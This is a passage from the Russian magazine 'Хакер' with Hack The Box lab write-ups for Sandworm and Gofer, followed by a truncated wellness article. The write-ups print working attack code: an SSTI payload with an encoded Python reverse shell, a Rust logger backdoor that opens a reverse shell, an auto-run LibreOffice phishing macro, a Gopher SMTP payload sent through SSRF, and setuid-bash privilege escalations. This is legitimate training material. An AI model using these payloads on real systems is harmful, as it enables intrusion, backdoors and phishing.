Пробуем про читать содержимое этого каталога и получаем сооб щение
об ошиб ке. Оказывается,  каталог /opt/gnuplot дос тупен  для  записи
и исполне ния, но недоступен для чте ния.




            Вывод содержимого каталога /opt/gnuplot





                    Разрешения каталога gnuplot

Тогда попробуем отследить запус каемые про цессы, так как аргументы одно-
го из них могут раскрыть содер жимое засекреченного каталога. Для этого
используем ути литу pspy64.





                         Логи pspy64

Видим, что про исхо дит поиск фай лов с расширением .plt в каталоге /opt/
gnuplot. Най денные файлы выполняются с помощью gnuplot, причем
от имени поль зователя root. Так мы можем создать файл privesc.plt
и записать в него функцию system. Она выполнит команду chmod, чтобы наз-
начить S-бит коман дной обо лочке /bin/bash.


echo 'system "chmod u+s /bin/bash"' > /opt/gnuplot/privesc.plt

Спустя вре мя проверим разрешения на файл /bin/bash.



                     Разрешения файла /bin/bash




Когда у файла установлен атрибут setuid (S-атрибут), обычный поль зователь,
запускающий этот файл, получает повышение прав до пользователя — вла-
дельца файла в рам ках запущенного процес са. Пос ле получения повышенных
прав при ложе ние может выполнять задачи, которые недоступны обычному
поль зовате лю. Из-за воз можнос ти сос тояния гонки многие операци онные
системы игнориру ют S-атрибут, уста новленный shell-скриптам.



Заходим как суперполь зователь и забира ем флаг.


/bin/bash -p





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В этом райтапе я покажу, как совершать
побег из сендбок са Firejail, чтобы повысить
привилегии в Linux. Еще мы найдем и про-
экс плуатируем уяз вимость SSTI в сервисе
про вер ки под писи PGP, а также заложим             RalfHacker                                                                                             hackerralf8@gmail.com
бэкдор в про ект, написан ный на Rust.


А поможет нам в этом тренировоч ная машина Sandworm с площадки Hack
The Box. Уровень ее сложности — сред ний.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.218    sandworm.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел три открытых пор та:
 • 22 — служба OpenSSH 8.9p1;
 • 80 и 443 — веб-сервер Nginx 1.18.0.

В заголов ке http-title присутству ет редирект на адрес https://ssa.htb.
Добав ляем и этот домен в файл /etc/hosts.


10.10.11.218 sandworm.htb ssa.htb





                 Главная стра ница сайта https://ssa.htb/

На сай те находим формы для шифрования текста и проверки подписи.





                       Страница шифрования





                    Страница про вер ки подписи

По ссылке на странице получаем ключ PGP.





                           Ключ PGP

Больше ничего интересного не находим, а так как мы уже увидели много
интерес ных страниц, попробуем поискать другие.




Одно из пер вых действий при тес тировании безопасности веб-приложе-
ния — это сканиро вание методом перебо ра каталогов, чтобы найти скры тую
информацию и недоступные обыч ным посети телям функции. Для этого можно
использовать программы вроде dirsearch, DIRB или ﬀuf. Я предпочитаю
feroxbuster.
  При запуске указываем следующие параметры:
 • -u — URL;
 • -w — словарь (я использую сло вари из набора SecLists);
 • -t — количество потоков;
 • -d — глу бина сканирования.



Задаем нуж ные парамет ры и запус каем ска ниро вание:


feroxbuster -k -u https://ssa.htb -t 256 -d 1 -w directory_2.3_
medium_lowercase.txt





        Ре зультат ска нирования катало гов с помощью feroxbuster

Находим на сайте как админку, так и стра ницу авторизации.


ÒÎ×ÊÀ ÂÕÎÄÀ

Гадать, какая используется технология, не приш лось, так как баннер Powered
by Flask расположен на главной странице.





                        Баннер Powered by

Протес тируем сервис проверки под писи. Для этого сна чала сге нери руем
PGP-ключ, подпишем сооб щение, после чего обе записи отправим на сайт.
При соз дании клю ча PGP нужно указать имя и адрес элек тронной почты.


pgp --gen-key


name1
<email@mail.comp>





                     Генерирование PGP-клю ча

Затем экспортируем созданный ключ. Его идентификатор — это строка вида
"имя"  "адрес  электронной  почты". После чего под пишем сообщение
message.


gpg -a -o pub.key --export 'name1 <email@mail.comp>'
echo 'message' | gpg --clear-sign





                      Под пись сооб щения

Пе реходим к сер вису и передаем экспор тированный ключ и под писанное
сообщение, пос ле чего про веряем подпись.





                      Проверка подписи





                   Результат проверки подписи

В ответе выводится имя, исполь зованное при соз дании ключа PGP. Так
как  задействован фрей мворк  Flask  и  сер вер  получает, обрабатывает
и выводит контролируемые пользователем дан ные, с боль шой вероятностью
при меняются шаблоны. В этом слу чае сто ит про верить наличие уязвимос ти
SSTI.


ÒÎ×ÊÀ ÎÏÎÐÛ

SSTI
Сге нери руем новый ключ и вместо имени введем шаблон {{7*7}}.





                      Соз дание клю ча PGP

Ес ли уязвимость есть, то на месте имени мы увидим резуль тат выполнения
выражения — 49. Снова экспортиру ем  ключ, подписываем сооб щение
и отправ ляем их на сервер.


gpg -a -o pub.key --export '{{7*7}} <q@q.comp>'
echo 'message' | gpg --clear-sign





                   Результат проверки подписи

И получаем вместо име ни результат выполнения выраже ния в шаблоне. Так
мы узнали, что сервис уязвим.




Server-Side Template Injection (SSTI), или инъекция шаблонов на стороне сер-
вера, — это механизм атаки, при котором зло умышленник внедряет в шаб лон
вре донос ный код. Шаблоны нужны веб-разработчикам, чтобы можно было
нас траивать внешний вид сай та только в одном мес те и затем не копировать
вруч ную. По сути, шаб лон — это документ HTML, где в нужных местах отме-
чены перемен ные и коман ды, которые при генера ции итоговой страницы
будут заменены дан ными. В том числе это могут быть и данные, полученные
от посети теля сайта.
   Атака затрагивает момент, ког да присланная информация объеди няется
с шаблоном. Злоумышленник фор миру ет стро ку таким образом, что бы она
не прос то под ставилась в шаб лон, но была интерпретирована как код. Если
это возможно, то он добавит свои директивы, с помощью которых выпол нит
эксфильтрацию данных или даже захватит веб-сер вер.



Попробуем выполнить реверс-шелл на Python. Для этого сначала сге нери-
руем его при помощи сервиса Online Reverse Shell Generator. На сайте ука-
зываем адрес и порт локального хоста и задаем автоматичес кое кодиро-
вание нагрузки в Base64.





                        Online Reverse Shell Generator

Выпол нять закодирован ный реверс-шелл будем при помощи вот такой конс-
трукции:


bash -c "echo <BASE64-REVERSE-SHELL> |base64 -d | bash"

Для выполнения команды через командную оболоч ку используем сле дующую
наг рузку SSTI:


{{self.__init__.__globals__.__builtins__.__import__('os').popen(
'COMMAND').read()}}

Сге нери руем ключ с нагрузкой вмес то имени.


{{ self.__init__.__globals__.__builtins__.__import__('os').popen(
'bash -c "echo
cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY
2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIj
EwLjEwLjE0LjM3Iiw0MzIxKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHM
uZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5z
cGF3bigic2giKSc=
| base64 -d | bash" ') .read() }}





                        Соз дание клю ча

Те перь привычным образом экспортируем ключ и подписываем сообщение.
Но перед отправ кой на проверку запускаем листенер  (rlwrap nc  -nlpv
4321). Сразу же после отправки получаем сессию поль зователя atlas.





                    Сессия поль зователя atlas




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



            ВЫХОДИМ ИЗ ПЕСОЧНИЦЫ
                      FIREJAIL И ПОВЫШАЕМ
                 ПРИВИЛЕГИИ В LINUX





ÏÐÎÄÂÈÆÅÍÈÅ

Sandbox Escape
Мы получили какой-то шелл, веро ятно уре занный, потому что не выпол няют-
ся, нап ример, команды curl, wget, rm и cp. Воз можно, мы попали в песоч-
ницу, что подтверждаем, прос мотрев каталог ~/.config. Там мы находим
другой каталог — firejail.





                 Содержимое каталога ~/.cong

Firejail — это простая в исполь зовании сис тема изолированного выполнения
графических, консоль ных и серверных приложений, которая огра ничивает
рабочую сре ду потен циально уязвимых прог рамм и тем самым повыша ет
безопасность систем. Для это го используют ся пространс тва имен, фильтра-
ция системных вызовов и возможностей AppArmor.
   Также видим каталог httpie. HTTPie — это консольный HTTP-клиент,
который предназначен для тестирования, отладки и общего взаимодействия
с HTTP-серверами. Получим полный листинг со все ми подкаталогами.





                 Все содержимое катало га ~/.cong

В катало ге httpie/sessions/localhost_5000 видим доступный для чтения
файл admin.json. В самом файле есть  учетные данные поль зователя
silentobserver.





                 Содержимое файла admin.json

С найденными учетными данными под ключаемся по SSH и забираем пер вый
флаг.





                       Флаг пользователя


Ïîëüçîâàòåëü atlas
Те перь у нас есть пол ноценная обо лоч ка и нам нужно собрать информацию.
Я, как обычно, исполь зую для это го скрип ты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.


Заг ружаем на хост скрипт для Linux, даем пра во на выпол нение и прис тупаем
к сканиро ванию.
  Обнаружи ваем, что для приложения firejail установлен бит SUID,
но оно дос тупно толь ко группе пользователя jailer.





                    Приложения с SUID-битом

В катало ге /opt находим два проекта, которые относятся к группе поль-
зователя atlas.





                   Содержимое каталога opt

Файлы одного из этих проектов мы можем модифицировать.





                 Фай лы, дос тупные для записи

В дереве про цессов видим запущенную через cron от имени пользовате ля
atlas команду cargo run --offline.



                     Дерево процессов

Так как cron запускает какие-то при ложения, пос мотрим, что запуще но прямо
сей час, при помощи утилиты pspy64. В ее выводе находим запуск найденной
коман ды.





                   Вывод утилиты pspy64

Так как запускается файл из проекта tipnet, прос мотрим исходный код при-
ложения /opt/tipnet/src/main.rs.





                  Со держимое файла main.rs

Это программа на Rust, которая взаимо действует с базой данных MySQL. Код
позволя ет выполнять запросы и манипулировать данными в базе данных.
Кро ме того, программа может искать записи в базе данных по клю чевым сло-
вам и регис трировать действия в жур нале. Но самой первой строкой подклю-
чается модуль logger. А его мы можем найти в проекте, где у нас есть право
на запись.





            Содер жимое каталога /opt/crates/logger/src





                   Содержимое фай ла lib.rs

Давай запишем в код бэкдор, что бы при каждом вызове функции log мы
получали реверс-шелл на порт 4321. Код реверс-шел ла на Rust дос тупен
на GitHub.


extern crate chrono;


use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};


use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;


pub fn log(user: &str, query: &str, justification: &str) {
   let sock = TcpStream::connect("10.10.14.37:6543").unwrap();


   let fd = sock.as_raw_fd();


   Command::new("/bin/bash")
       .arg("-i")
       .stdin(unsafe { Stdio::from_raw_fd(fd) })
       .stdout(unsafe { Stdio::from_raw_fd(fd) })
       .stderr(unsafe { Stdio::from_raw_fd(fd) })
       .spawn()
       .unwrap()
       .wait()
       .unwrap();


   let now = Local::now();
   let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
   let log_message = format!("[{}] - User: {}, Query: {},
Justification: {}\n", timestamp, user, query, justification);


   let mut file = match OpenOptions::new().append(true).create(true).
open("/opt/tipnet/access.log") {
       Ok(file) => file,
       Err(e) => {
           println!("Error opening log file: {}", e);
           return;
       }
   };


   if let Err(e) = file.write_all(log_message.as_bytes()) {
       println!("Error writing to log file: {}", e);
   }
}

Затем собираем модуль и ждем, когда прилетит бэкконнект.


cargo build





                       Сборка проекта





                    Сессия поль зователя atlas


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

При разведке мы также определили, что у исполняемого файла firejail
выставлен S-бит. Теперь мы можем этим воспользовать ся. При помощи экс-
пло ита для выхода из песоч ницы мы получим сессию с теми же привиле-
гиями, с которы ми был запущен firejail. А так как мы можем запускать его
от имени root, то это явный путь к повышению при виле гий. Только одной сес-
сии будет мало, поэтому вернемся к предыдущему шагу и сде лаем себе
еще одну сессию на пор те 6543. Затем загружаем эксплоит на хост и запус-
каем в пер вой сессии.




                        За пуск эксплоита

Он покажет нам следующую команду, которую мы запускаем во второй сес-
сии.





              Получение привилегирован ного шелла

Как можно видеть, во вто рой сес сии мы сразу получаем новый шелл.
И теперь мы можем изменить пользователя на root без ввода всяких паролей.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В этом райтапе я покажу, как искать и экс-
плуатировать  уязвимос ти  use  after  free
и path hijacking для повыше ния прав в сис-
теме.  А  для  начала  заюзаем  SSRF
для отправ ки фишин говой ссылки с вре-             RalfHacker                                                                                             hackerralf8@gmail.com
донос ным  макросом,  чтобы  про никнуть
на хост.


А поможет нам в этом тренировоч ная машина Gofer с площад ки Hack The Box.
Уровень ее — сложный.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.225 gofer.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел несколь ко откры тых портов:
 • 22 — служба OpenSSH 8.4p1;
 • 80 — веб-сервер Apache 2.4.56;
 • 139 и 445 — служба Samba 4.6.2.

Также мы узнаём, что фильтруется подключение к пор ту 25, по которому
работа ет служба SMTP.
  Первым делом проверим SMB, в отли чие от веба этот протокол не пот-
ребует много вре мени для анализа.


enum4linux -a gofer.htb





               Резуль тат сканирования службы Samba

В выводе боль ше все го интересен список общих ресурсов SMB. К некоторым
катало гам мы можем получить дос туп без использования учетных дан ных.


ÒÎ×ÊÀ ÂÕÎÄÀ

Под клю чаемся к SMB-ресурсу, где мы находим каталог backup, а в нем сох-
раненное сообщение.


smbclient //gofer.htb/shares





                 Содержимое обще го ресурса

Скачиваем сообщение и чита ем. Там говорится о поль зователе, который
переходит по всем фишинговым ссылкам, поэтому почта теперь работает
только для внутренних поль зователей. При этом теперь будут открываться
только документы ODT.





                   Содержимое файла mail

Учтем это на будущее и перейдем к сайту.





                        Главная стра ница сай та

На самом сай те ничего интерес ного, кроме списка сотрудников. Поэтому
приступаем к сканированию.




Одно из пер вых действий при тес тировании безопасности веб-приложе-
ния — это сканиро вание методом перебо ра каталогов, чтобы найти скры тую
информацию и недоступные обыч ным посети телям функции. Для этого можно
использовать программы вроде dirsearch, DIRB или ﬀuf. Я предпочитаю
feroxbuster.
  При запуске указываем следующие параметры:
 • -u — URL;
 • -w — словарь (я использую сло вари из набора SecLists);
 • -t — количество потоков;
 • -d — глу бина сканирования.



Задаем нуж ные парамет ры и запус каем ска нер:


feroxbuster -u http://gofer.htb/ -t 256 -d 1 -w directory_2.3_medium_
lowercase.txt





        Ре зультат ска нирования катало гов с помощью feroxbuster

Но вых фай лов и катало гов не обнаружили, поэтому переходим к сле дующему
шагу — сканированию поддоменов. Делать это будем с помощью ﬀuf.
Парамет ры те же, что у feroxbuster, но добавятся еще два:
 • -H — HTTP-заголо вок;
 • -fc — фильтр по коду ответа.


ffuf -u http://gofer.htb -H 'Host:FUZZ.gofer.htb' -w subdomains-
bitquark-top100000.txt -fc 400,301





                Ре зультат ска ниро вания под доменов

Добав ляем най денный поддомен в файл /etc/hosts и про веря ем новый
сайт. Там нас встре чает HTTP-аутентификация.


10.10.11.225 gofer.htb proxy.gofer.htb





                      Запрос учетных данных


HTTP auth bypass
Есть нес колько способов обхода неп равильно настроенной HTTP-аутен-
тификации. Самый простой и быстрый — сме на метода запроса с GET
на POST (либо PUT).





                     GET-запрос в Burp Repeater

В Burp Repeater лег ко это сделать, дос таточно выб рать нужный пункт в кон-
текстном меню.





                    POST-запрос в Burp Repeater

И при POST-зап росе получаем уже другой ответ.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



        ЭКСПЛУАТИРУЕМ PATH HIJACKING
            В СВЯЗКЕ С USE AFTER FREE





ÒÎ×ÊÀ ÎÏÎÐÛ

В полученном ответе нам сооб щают, что в URL не хватает параметра. Можно
перебрать параметры по словарю и найти такой ответ сервера, который, воз-
можно, будет отличать ся от основной массы. Для перебора я исполь зую Burp
Intruder.





                    Burp Intruder — вкладка Positions

Что бы в таблице резуль татов отоб ражался ответ сер вера, перей дем к вклад-
ке Settings, выберем опцию Grep → Extract и ука жем интересу ющую нас
позицию.





                    Burp Intruder — вкладка Settings





                    Burp Intruder — результат ата ки

Таким образом обнаруживаем параметр url.


SSRF
Так как мы дол жны передать URL, можно пред положить, что сервис выполнит
запрос на него. Для теста запус тим веб-сервер:


python3 -m http.server 80

И укажем на сайте свой адрес. В логах веб-сервера уви дим подключение,
а на сай те отоб разится листинг катало га веб-сервера.




                      Ло ги веб-сервера





                  Резуль тат выполнения запроса

Сра зу проверяем наличие уязвимос ти SSRF, которая позволит обра щать ся
к внутренним ресур сам и сервисам сис темы. Однако запрос к localhost
блокируется, поскольку сло во находится в черном списке. Но мы можем най-
ти варианты, которые не будут фильтровать ся.





                  Резуль тат выполнения запроса

Пробуем прочитать файл /etc/passwd через про токол file. В этом слу чае
нам сообщают, что блокируется пос ледова тельность file://.





                  Резуль тат выполнения запроса

Тогда попробуем обратиться, указав не file://, а file:/. И это позволя ет
нам получить содержимое фай ла.





                Со держимое файла /etc/passwd

По читав на сер вере несколько фай лов, ничего ценного не находим. Тогда я
решил про верить очень интересный вектор: через SSRF и Gopher. Давай поп-
робуем отпра вить сооб щение тому самому поль зователю, который открывает
все ссылки. По ссылке будет рас положен документ ODT, выполняющий мак-
рос с реверс-шеллом.
  Для это го нам нужно узнать поч товый адрес пользователя и как-то обойти
фильтр, чтобы обращать ся к локаль ному хосту через SSRF. Из пись ма мы зна-
ем имя пользователя — Jocelyn. Находим его фамилию на сайте и составля-
ем правдоподобный почтовый адрес по тому же шаблону, что и у отпра вите-
ля. Получается jhudson@gofer.htb.





                     Список поль зователей

Те перь нам нужен адрес, который поможет обойти фильтрацию. Здесь нас
выручит Burp Intruder и список для обхода SSRF. Также на вкладе Settings
установим опцию Extract.





                    Burp Intruder — вкладка Positions





                    Burp Intruder — вкладка Settings





                       Результат перебора

По   результатам   сканирования   видим,   что  можно   закодировать
адрес 127.0.0.1 в Hex.


Gopher mail
Че рез най денную SSRF поп робуем отправить сообщение со ссылкой целево-
му пользователю. Берем следующее сооб щение и кодируем все символы \r\
n как %0d%0a.


gopher://0x7f000001:25/xHELO
MAIL FROM:<jdavis@gofer.htb>
RCPT TO:<jhudson@gofer.htb>
DATA
From: <jdavis@gofer.htb>
To: <jhudson@gofer.htb>
Subject: Link


http://10.10.16.23/file.odt



.
QUIT





                     Исходное сооб щение



                Сообщение, закоди рованное URL

На локальном хосте запустим веб-сервер на Python и выполним запрос, где
в параметре url будет переда вать ся сформирован ная нагрузка.





                  Резуль тат выполнения запроса

Когда сервер зап росит этот URL, пользователю Jocelyn отправится сооб-
щение со ссылкой. Если он перей дет по ней, мы увидим запрос к файлу
на нашем веб-сервере.




                      Ло ги веб-сервера

Вектор оказался верным, теперь сформиру ем документ с макросом.


Office phishing
Открываем LibreOﬃce и в меню выбира ем Tools → Macros → Organize Macros
→ Basic, где находим текущий документ.





                     При ложение LibreOﬃce





                  Окно управления макросами

Создаем новый мак рос, который выполнит реверс-шелл.


Sub Main
       Shell("bash -c 'bash -i >& /dev/tcp/10.10.16.23/4321 0>&1'")
End Sub





                    Окно изме нения мак роса

А теперь настроим автозапуск макроса при открытии документа. Для этого
в окне управле ния макросами кли каем по пункту Assign, где переходим
на вкладку Event и выбираем событие Open Document. Которому через Macro
Selector назначаем соз данный мак рос.





                  Настройка авто запуска макроса





                 Настройка события Open Document

Сохраняем в формате ODT и загружаем на веб-сервер документ.
  Запускаем лис тенер:


pwncat-cs -lp 4321

Затем повторяем фишин говую атаку и получаем коннект.





                       Флаг пользователя




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



        ЭКСПЛУАТИРУЕМ PATH HIJACKING
            В СВЯЗКЕ С USE AFTER FREE





ÏÐÎÄÂÈÆÅÍÈÅ

Те перь нам необ ходимо собрать информацию и прикинуть варианты прод-
вижения. Я, как всегда, буду использовать для этого скрипты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.


Мы получили мно го информации, отберем самое важ ное.
  Привиле гия  Linux cap_net_admin, выданная tcpdump, поз воляет нам
использовать эту команду для сниффинга трафика.




                      Опция tcpdump




                                Linux capabilities

Из файла .htpasswd получаем хеш пароля для пользовате ля tbuckley.





            Содержимое фай ла /etc/apache2/.htpasswd

Сре ди исполняемых файлов с выставленным битом SUID есть неизвес тный: /
usr/local/bin/notes.





               Файлы с установленным SUID-битом

Также я всегда проверяю запускаемые про цессы с помощью pspy64. В логах
видим зап рос к уже зна комо му сайту, где переда ются учетные данные
для HTTP-аутентификации.





                         Логи pspy64

Видимо, задумка автора машины была в том, что бы решающий записал тра-
фик и нашел этот зап рос в дампе. Но обна ружился и другой путь для получе-
ния логина и пароля. С полученными учетными дан ными авторизуемся в сис-
теме.




                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Те перь  перехо дим  к  неиз вес тно му  исполняемо му фай лу  с  S-битом.
При запуске он пре доставляет нам выбор нескольких действий.





               Ре зультат запуска исполня емого фай ла

Скопируем этот файл на локальный хост и откроем в любом удобном деком-
пиляторе. Я исполь зую IDA Pro с Hex-Rays.


scp tbuckley@gofer.htb:/usr/local/bin/notes ./

Я нем ного пре образовал код, что бы его было удобнее анализировать.
Теперь мы можем разобрать поведение программы при выборе каждого
из предложен ных вариантов.
 1. В этом вари анте с помощью malloc выделяется 40 байт, где пер-
   вые 24 будут запол нены введенным име нем пользователя, а с 24-го байта
   будет храниться роль пользователя: user или admin (строки 31–50).
 2. Эта ветка кода отве чает за вывод текущих име ни пользователя и его роли
   (строки 51–56).
 3. С помощью free освобождает ся память, выделенная для име ни поль-
   зователя.





                       Псев докод функции main

 4. В этом вари анте снова выделяется 40 байт, но теперь для сохранения
   заметки (строки 61–68).
 5. Вы водит заметку на экран (строки 69–71).
 6. Пока ни для чего не предназначен.
 7. Освобождает память, выделенную под замет ку.
 8. Самый инте ресный блок кода: если пользователь существует и явля ется
  админис тратором, то от имени пользователя root выполнится команда
   tar.





               Псевдокод функции main (продолжение)

Так как путь к исполня емому файлу tar не ука зан, система последовательно
будет искать его по путям, ука занным в PATH. А это открывает дорогу к ата ке
path hijacking. Для это го нам нужно создать свой скрипт с име нем tar
и добавить в PATH каталог, в котором он будет расположен. Тогда при вызове
функции system запустится наш скрипт tar.


echo '#!/bin/bash' > tar
echo 'chmod u+s /bin/bash' >> tar
chmod 777 tar
export PATH= ~:$PATH





                      Соз дание скрипта tar

Те перь решим вопрос, как прой ти проверку на админис тратора. Оба вари-
анта освобождения памяти выполнены без ее очистки. И в случае с заметкой
(где мы можем записать 39 байт), и в случае с именем пользователя (где мы
можем записать 24 бай та) выделяется 40 байт. Но дело в том, что если
выделить память функци ей malloc, а затем освободить с помощью free
и снова выделить с помощью malloc блок памяти того же объема, то будет
выделена память по одному и тому же адресу! Вот почему важно перед осво-
бож дени ем очи щать память с помощью memset, а указате лю присваивать
зна чение 0. При удалении пользователя это го не происходит.
  Получа ется, что мы можем создать пользователя, а затем удалить его, что-
бы вызвать malloc, затем free, а затем инициализиро вать переменную
input, где хранится имя пользователя.





                Соз дание и уда ление пользователя

Те перь при создании заметки будет выделен блок памяти, который только что
был освобожден, но на него будет указывать не только переменная ptr, отве-
чающая за заметку, но и переменная input, отве чающая за пользовате ля!
  Заполняем замет ку рандомными 24 сим волами, пос ле которых записы-
ваем стро ку admin. Тогда переменная input+24 будет содер жать роль admin.
Теперь при выборе последнего пункта мы пройдем про верку на администра-
тора. Это го мож но было бы избежать, если бы переменной input присваива-
лось значение 0 в вет ке 3. Эта уязвимость носит наз вание use after free, так
как мы используем указатель на блок памяти после освобождения и переза-
писи.





                        Эксплуата ция UAF

В скрипте tar мы назначили S-бит файлу коман дной обо лочки /bin/bash
и можем повысить при вилегии до рута.





                   Провер ка файла /bin/bash





                           Флаг рута

Машина захвачена!
GEEK





В ноябре за окном серое небо и голые
деревья, а значит, нам надо постараться,
чтобы кукуш ка осталась дома, крыша сто-
яла на положенном месте и чердак не про-
текал. В этой статье ты най дешь под борку             yambuto                                                                                      yambuto@gmail.com
советов, как помочь себе находиться в ста-
бильном душевном состоянии. Что может
быть акту альнее в такие вре мена, верно?




По явле ние такой статьи в «Хакере», возможно, уди вит тебя, однако редак-
ционный совет единогласно поддержал экспе римент. Почему бы не поп-
робовать разок-другой удалить ся от наших обычных тем и не написать
о вещах, которые могут помочь кому-то из читателей сделать свою жизнь луч-
ше? Статья дос тупна без платной под писки, так  что, если понравится,
не забудь поделиться ссылкой с друзьями.



Сра зу пре дуп реждаю, что большая часть собранных здесь советов —
это самый обыкновенный и уже набивший всем оскомину ЗОЖ, то есть здо-
ровый образ жизни. Но при чем здесь ЗОЖ, если речь идет не о физическом
здоровье, а о ментальном? Сейчас раз беремся.




Ес ли у тебя реально едет кры ша, то бро сай читать эту статью и записы вай ся
на прием к врачу. Признаки, которые нельзя игнорировать:
 • приступы агрессии;
 • панические атаки;
 • потеря интереса к жизни, к людям, к своим увлечениям;
 • нежелание делать базовые действия, нап ример принимать душ;
 • склон ность причинять себе вред, навяз чивые мыс ли об этом;
 • час тые кош марные сновидения или бес сонница;
 • постоянная усталость, сонливость;
 • проблемы с аппе титом (переедание либо, наоборот, отсутс твие аппе-
   тита);
 • фо бии, навязчивые привычки, которые тебе мешают;
 • необъяснимые сме ны настро ения;
 • неуместные и спонтанные эмоциональные реакции;
 • тре вожность, отча яние, безысходность, суици дальные мыс ли.




ÇÀ×ÅÌ ÌÍÅ ÝÒÎ?

Ес ли тебе кажется, что ты не животное, а давно эволюци они ровал и теперь
твой разум преобла дает над жалким земным телом, спе шу тебя разоча-
ровать. Твое мен тальное состояние настолько силь но зависит от бренной
обо лоч ки, что даже обидно. Вся эта сознатель ность, воля и сила духа дер-
жатся на базовом здо ровье тела.
  С точки зре ния эво люции тот период, когда наш вид ведет всю эту
интеллектуально-духов ную жизнь, очень нез начителен. Примерно как тонкий
налет мха на огромном валуне веков, в течение которых человек учил ся
выживать в дикой при роде и первобытных общес твах.
  Поэто му пос ледние поколения людей так кроет по части душевного здо-
ровья: мир изменился кардинально, а человек в глубине остался древним.
Наш мозг приспособлен совсем к другой жизни, а мы перегружаем его неп-
рерывным  потоком  информа ции,  раз рознен ными  взаимодей ствиями,
дешевым дофами ном и, главное, стрес сом. Осо бенно тяжело приходится
айтишникам, у которых компьютер — это и работа, и хобби, и все виды дос-
тупно го отды ха одновре менно.
  Пожалуй, можно смело сказать, что любой читающий эту статью испы тыва-
ет на себе дол говременный стресс и его разрушительные пос ледс твия —
особенно в последние годы.
   Это расшатывает наше сос тояние, делает нас более уязвимыми и неус-
той чивыми под воздей ствием внешних событий и внутренних процессов.
А вот когда ты здоров, выспался, отдохнул и хорошо поел, согласись, тебя
нам ного слож нее выбить из колеи — ты устойчив и готов бороться!
  Получа ется, твое психичес кое состояние, поведе ние и нас троение сильно
зависят от того, насколь ко хорошо ты заботишься о своем теле. Условия
прос ты: обеспечь сво ей пещерной сос тавляющей самый премиаль ный сер-
вис — и она откроет новый уровень продуктивнос ти для твоего драгоценного
высокоразвитого сознания. Так что с разговора о теле мы и начнем.


ÐÅÆÈÌ È ÎÒÄÛÕ

О режиме неспроста говорят из каж дого утю га. Постоянный режим дня
помогает нервной сис теме нормально работать, тем самым стабилизирует
пси холо гическое состояние, повышает качество сна и помога ет иммунной
системе. Уж не говоря о продуктивности: если делать одни и те же действия
в подходящее вре мя, тебе будет лег че приступить и не отвле каться, будет
мень ше прок расти нации — так можно натас кать себя на сосредоточенную
работу по расписанию.
  Конечно, совет «наладить режим» уже сидит в печенках у каждого. Мы ско-
рее попробуем на себе випассану и микродозинг мухоморов, только бы
